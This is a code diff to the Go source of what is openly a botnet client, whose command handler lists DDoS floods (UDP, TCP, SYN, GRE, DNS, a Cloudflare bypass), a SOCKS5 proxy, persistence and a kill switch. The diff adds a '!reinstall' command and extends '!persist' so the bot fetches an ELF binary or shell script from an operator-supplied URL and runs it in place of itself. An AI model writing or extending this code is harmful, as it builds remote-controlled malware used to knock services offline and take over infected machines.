@@ -60,7 +60,8 @@ func raichu() chan struct{} {
 //   - !detach, !bg: Execute command in background
 //   - !stop: Stop all running attacks
 //   - !udpflood, !tcpflood, !http, !https, !tls, !syn, !ack, !gre, !dns, !cfbypass: DDoS attacks
-//   - !persist: Setup persistence mechanisms
+//   - !persist [url]: Setup persistence (copies self, or fetches url if given)
+//   - !reinstall <url>: Fetch ELF or .sh from url and exec-replace current process
 //   - !kill: Terminate the bot
 //   - !info: Return system information
 //   - !socks: Start SOCKS5 proxy
@@ -183,7 +184,18 @@ func blackEnergy(conn net.Conn, command string) error {
 			go arkrai(target, targetPort, duration)
 		}
 	case "!persist":
-		go dragonfly()
+		url := ""
+		if len(fields) >= 2 {
+			url = fields[1]
+		}
+		go dragonfly(url)
+		conn.Write([]byte(msgPersistStart))
+	case "!reinstall":
+		if len(fields) < 2 {
+			conn.Write([]byte(fmt.Sprintf(protoErrFmt, "usage: !reinstall <url>")))
+			return nil
+		}
+		go reinstall(fields[1])
 		conn.Write([]byte(msgPersistStart))
 	case "!kill":
 		conn.Write([]byte(msgKillAck))
